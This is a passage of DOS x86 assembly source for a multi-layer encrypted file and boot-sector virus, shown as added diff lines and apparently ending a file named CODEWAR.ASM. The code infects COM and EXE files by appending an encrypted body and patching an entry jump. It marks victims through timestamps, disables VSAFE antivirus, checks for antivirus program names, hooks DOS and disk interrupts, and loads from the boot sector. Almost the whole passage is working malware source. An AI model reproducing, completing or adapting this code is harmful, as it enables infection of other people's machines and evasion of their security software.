+
+        PUSH    AX
+
+        MOV     word ptr DS:[ofs E1_Idx_Val -Reloc],(ofs E1_Encrypted_Code-ofs Vir_start)-Camouf
+        MOV     word ptr DS:[ofs E2_Idx_Val -Reloc],(ofs E2_Encrypted_Code-ofs Vir_start)
+        MOV     word ptr DS:[ofs E3_Idx_Val -Reloc],(ofs E3_Encrypted_Code-ofs Vir_start)
+
+        POP     AX
+
+        pop     bx
+        jmp     Attach
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Read_Infect:
+
+        CALL    Seek_TOF
+
+; read xx bytes
+
+        MOV     AH,3Fh
+        MOV     CX,Header_Length
+        MOV     DX,ofs File_buffer -Reloc
+        INT     21h
+        jnb     read_ok
+        jmp     Infect_Ret
+
+read_ok:
+        cmp     word ptr cs:[ofs File_buffer -Reloc],"ZM"
+        jnz     Process_COM
+        jmp     Process_EXE
+
+;----------------------------------------------------------------------------
+Process_COM:
+
+        mov    byte ptr cs:[ofs File_Type -Reloc],File_Type_COM
+
+
+; seek to EOF
+
+        CALL    Seek_EOF
+
+; Save 3 bytes
+
+        MOV     ax,word ptr DS:[File_buffer -Reloc]
+        MOV     DS:[ofs Rest1 -Reloc],ax
+        MOV     al,byte ptr DS:[File_buffer -Reloc +2]
+        MOV     DS:[ofs Rest2 -Reloc],al
+
+        CALL    Seek_EOF
+
+; file smaller than xxxx bytes ?
+
+        CMP     AX,F_Min_LengthCOM
+        JB      Infect_Ret
+
+; file larger than xxxx bytes ?
+
+        CMP     AX,F_Max_LengthCOM
+        JA      Infect_Ret
+
+
+        CALL    Padding
+
+
+; Construct index for decryptor
+
+        PUSH    AX
+
+; layer 1
+        ADD     AX,100h+ (ofs E1_Encrypted_Code-ofs Vir_Start)-Camouf
+        MOV     DS:[ofs E1_Idx_Val -Reloc],AX
+
+; layer 2
+        pop     ax
+        push    ax
+
+        ADD     AX,100h+ (ofs E2_Encrypted_Code-ofs Vir_Start)
+        MOV     DS:[ofs E2_Idx_Val -Reloc],AX
+
+; layer 3
+        pop     ax
+        push    ax
+
+        ADD     AX,100h+ (ofs E3_Encrypted_Code-ofs Vir_Start)
+        MOV     DS:[ofs E3_Idx_Val -Reloc],AX
+
+
+        POP     AX
+
+; construct and insert a JUMP-INSTR.
+
+        MOV     byte ptr DS:[File_buffer -Reloc],0E9h
+        SUB     AX,3
+        MOV     word ptr DS:[File_buffer+1 -Reloc],AX
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Attach:
+
+; write body at EOF
+
+        MOV     AH,40h
+        MOV     CX,Virus_Length
+        MOV     DX,ofs Buffer -Reloc
+        CALL    Encrypt_Virus
+        INT     21h
+        JB      Infect_Ret
+
+; write JUMP to TOF
+
+        MOV     AL,0
+        CALL    Seek_TOF
+
+        MOV     AH,40h
+        MOV     CX,Header_Length
+        MOV     DX,ofs File_buffer -Reloc
+        INT     21h
+
+; restore time stamps
+
+        mov     AX,5701h
+        mov     cx,cs:[ofs Old_Time -Reloc]
+        mov     dx,cs:[ofs Old_Date -Reloc]
+        and     cl,11100000b
+        or      cl,Time_Stamp                      ; Mark with Time-ID
+        INT     21h
+
+Infect_Ret:
+        RET
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Padding:
+        MOV     AH,AL
+        MOV     AL,16
+        SUB     AL,AH
+        AND     AX,1+2+4+8
+        MOV     DX,AX
+
+; seek forward
+        MOV     AL,01h
+        call    Seek_File
+        ret
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Deinstall_Vsafe:
+        pusha
+        push    ds es
+
+        MOV     DX,5945h
+        MOV     AX,0FA01h
+        INT     16h
+
+        pop     es ds
+        popa
+        ret
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Check_If_AV_Name proc near
+        cmp     byte ptr es:[di.SFT_File_Name],"L"
+        jz      Found_AV_Name
+        cmp     byte ptr es:[di.SFT_File_Name],"-"
+        jz      Found_AV_Name
+        cmp     word ptr es:[di.SFT_File_Name],"BT"
+        jz      Found_AV_Name
+        cmp     word ptr es:[di.SFT_File_Name],"CS"
+        jz      Found_AV_Name
+        cmp     word ptr es:[di.SFT_File_Name],"-F"
+        jz      Found_AV_Name
+        cmp     word ptr es:[di.SFT_File_Name],"IV"
+        jz      Found_AV_Name
+Found_AV_Name:
+        ret
+Check_If_AV_Name endp
+;----------------------------------------------------------------------------
+
+
+
+
+;----------------------------------------------------------------------------
+Seek_EOF:
+        MOV     AL,02h
+Seek_TOF:
+        XOR     DX,DX
+Seek_File:
+        MOV     AH,42h
+        XOR     CX,CX
+        INT     21h
+        RET
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Call_Old_Int21 PROC NEAR
+        pushf
+        call    dword ptr cs:(ofs Old_Int_21 -Reloc)
+        ret
+Call_Old_Int21 ENDP
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Call_Old_Int2F PROC NEAR
+        pushf
+        call    dword ptr cs:(ofs Old_Int_2F -Reloc)
+        ret
+Call_Old_Int2F ENDP
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+New_Int_24:
+        MOV     AL,03h
+        IRET
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Old_Int_13      dd      0
+Old_Int_1C      dd      0
+Old_Int_21      dd      0
+
+Old_Int_2f      dd      0
+
+Old_Time        dw      0
+Old_Date        dw      0
+
+Handle          dw      0
+
+; If Int 21h allready captured then 1 else 0
+Got_Int_21      db      0
+
+File_SizeHi     dw      0
+File_SizeLo     dw      0
+
+Padded          dw      0
+;----------------------------------------------------------------------------
+
+
+
+
+;----------------------------------------------------------------------------
+BS_first_word   dw      0
+Old_BS_code     db      32 dup ('B')
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; The first word of the PAR/BS is stored here
+
+JBS_first_word:
+        jmp     $ + 60h
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Start_JBoot:
+        XOR     DI,DI
+        MOV     SI,7C00h
+
+        CLI
+        MOV     SP,SI
+        MOV     SS,DI
+        STI
+
+; read xx sectors to 7e00h
+
+        MOV     ES,DI
+        MOV     AX,0204h                        ; !!!!!!  Sectors !!!!!!
+        MOV     BX,7c00h+512
+
+        MOV     CX,1234h
+        ORG     $-2
+Ptc_CX  dw      0004h
+
+        MOV     DX,1234h
+        ORG     $-2
+Ptc_DX  dw      0080h
+
+        nop
+        nop
+
+        INT     13h
+
+; Jump to the reload code from 2 sectors
+; The offset in the BS/PAR where this instuction is executed is at
+; BS/PAR:60h+($-Start_Jboot)
+
+        jmp     $ + 512 - ($-Start_Jboot+60h)       ;+512 -125
+;----------------------------------------------------------------------------
+
+
+
+
+;----------------------------------------------------------------------------
+        db      " [[  Cú0úDúEúWúAúR  ]]  <32>  Germany  1995  "
+        db      "Virtually called to life & survival by"
+
+        db      "RGOEPMSQO & NJOENBOJBD"
+
+        db      " ==>= AllE GUtEN DiNGE SiND DREi  ==>=  "
+
+        db      0
+;----------------------------------------------------------------------------
+
+
+Encrypted_Code_End      equ     $
+
+
+;----------------------------------------------------------------------------
+File_buffer:
+        db      Header_Length dup ('H')
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; here is the virus copied and encrypted
+Buffer  equ     $
+;----------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+CODE    ENDS
+        END     Sample
+
+
+; CODEWAR.ASM
+
